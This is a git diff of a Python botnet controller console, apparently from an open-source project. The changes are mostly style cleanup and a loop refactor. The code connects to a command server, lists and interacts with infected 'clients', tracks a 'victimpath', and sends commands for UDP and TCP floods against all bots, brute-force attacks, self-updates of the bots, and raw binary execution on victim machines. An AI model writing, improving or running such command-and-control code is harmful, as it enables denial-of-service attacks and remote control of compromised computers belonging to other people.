@@ -1,26 +1,26 @@
 #!/usr/bin/env python3
 
-## MIT License
+# MIT License
 ##
-## Copyright (c) 2017 Sayak Brahmachari
+# Copyright (c) 2017 Sayak Brahmachari
 ##
-## Permission is hereby granted, free of charge, to any person obtaining a copy
-## of this software and associated documentation files (the "Software"), to
-## deal in the Software without restriction, including without limitation the
-## rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
-## sell copies of the Software, and to permit persons to whom the Software is
-## furnished to do so, subject to the following conditions:
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to
+# deal in the Software without restriction, including without limitation the
+# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+# sell copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
 ##
-## The above copyright notice and this permission notice shall be included in
-## all copies or substantial portions of the Software.
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
 ##
-## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-## IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-## FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-## AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-## LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
-## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
-## IN THE SOFTWARE.
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+# IN THE SOFTWARE.
 
 import os
 import sys
@@ -53,7 +53,7 @@ help                    | Show this message
 Client Interaction:
 -------------------
 interact <id>           | Interact with client
-rawexec                 | Execute a binary and pipe the raw I/O to the
+rawexec  <command>      | Execute a binary and pipe the raw I/O to the
                           controller. (Unstable)
 stop                    | Stop interacting with client
 udpflood <ip>:<port>    | UDP flood with client
@@ -82,6 +82,8 @@ custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
 
 """
 # Helper Functions
+
+
 def send_msg(sock, sem):
     while True:
         data = sys.stdin.readline()
@@ -89,11 +91,15 @@ def send_msg(sock, sem):
             return
         sock.send(bytes(data, 'utf-8'))
 
+
 def recv_msg(sock):
     while True:
         data = sock.recv(20480).decode()
-        if data == 'stop': return
+        if data == 'stop':
+            sys.stdout.write("[Controller] - 'rawexec' finished\n")
+            return
         sys.stdout.write(data)
+
 
 def rawexec(s, command):
     sem = threading.Semaphore()
@@ -109,6 +115,7 @@ def rawexec(s, command):
         pass
     sem.release()
 
+
 def process(s, command):
     victimpath = ''
     breakit = False
@@ -123,13 +130,15 @@ def process(s, command):
         temp = s.recv(20480).decode()
         if "ERROR" not in temp:
             victimpath = temp
-        else: print(temp)
+        else:
+            print(temp)
     elif command == "":
         print("[CONTROLLER] Nothing to be sent...\n")
     else:
         s.send(bytes(command, 'utf-8'))
         print(s.recv(20480).decode())
     return breakit, victimpath
+
 
 def interact(s, command):
     s.send(bytes(command, 'utf-8'))
@@ -151,50 +160,52 @@ def interact(s, command):
     else:
         print(temporary)
 
+
 def run(s):
-    command = input("SB> ")
     try:
-        if command == "refresh":
-            s.send(bytes("refresh", 'utf-8'))
-            print(s.recv(20480).decode())
-        elif command == "list":
-            s.send(bytes("list", 'utf-8'))
-            print(s.recv(20480).decode())
-        elif "interact " in command:
-            interact(s, command)
-        elif "udpfloodall " in command or "tcpfloodall " in command:
-            s.send(bytes(command, 'utf-8'))
-            print("\n")
-        elif command == "selfupdateall":
-            s.send(bytes("selfupdateall", 'utf-8'))
-            print("\n")
-        elif command == "clear":
-            if sys.platform == 'win32':
-                os.system("cls")
+        while True:
+            command = input("SB> ")
+            if command.strip() is '': pass
+            elif command == "refresh":
+                s.send(bytes("refresh", 'utf-8'))
+                print(s.recv(20480).decode())
+            elif command == "list":
+                s.send(bytes("list", 'utf-8'))
+                print(s.recv(20480).decode())
+            elif "interact " in command:
+                interact(s, command)
+            elif "udpfloodall " in command or "tcpfloodall " in command:
+                s.send(bytes(command, 'utf-8'))
+            elif command == "selfupdateall":
+                s.send(bytes("selfupdateall", 'utf-8'))
+            elif command == "clear":
+                if sys.platform == 'win32':
+                    os.system("cls")
+                else:
+                    os.system("clear")
+            elif command == "quit":
+                s.send(bytes("quit", 'utf-8'))
+                s.close()
+                return
+            elif command == "help":
+                print(usage, commands)
+            elif command == "about":
+                print(about)
             else:
-                os.system("clear")
-        elif command == "quit":
-            s.send(bytes("quit", 'utf-8'))
-            s.close()
-            return
-        elif command == "help":
-            print(usage, commands)
-        elif command == "about":
-            print(about)
-        else:
-            print("[CONTROLLER] Invalid Command\n")
+                print("[CONTROLLER] Invalid Command")
     except KeyboardInterrupt:
         try:
             s.send(bytes("quit", 'utf-8'))
             s.close()
-            print("")
-            return
         except Exception:
             pass
+        print("")
+        return
     except Exception as ex:
         print("[CONTROLLER] Connection Closed Due to Error:", ex)
         s.close()
         return
+
 
 def main():
     print(about)
@@ -205,9 +216,8 @@ def main():
         sys.exit("[ERROR] Can't connect to server")
 
     s.send(bytes(password, 'utf-8'))
+    run(s)
 
-    while 1:
-        run(s)
 
 if __name__ == "__main__":
     if len(sys.argv) == 4:
@@ -217,7 +227,7 @@ if __name__ == "__main__":
     elif len(sys.argv) == 2 and sys.argv[1] in ['-h', '--help']:
         print(usage, commands)
     else:
-        #sys.exit(usage)
+        # sys.exit(usage)
         print(usage)
         host = '127.0.0.1'
         port = 9090
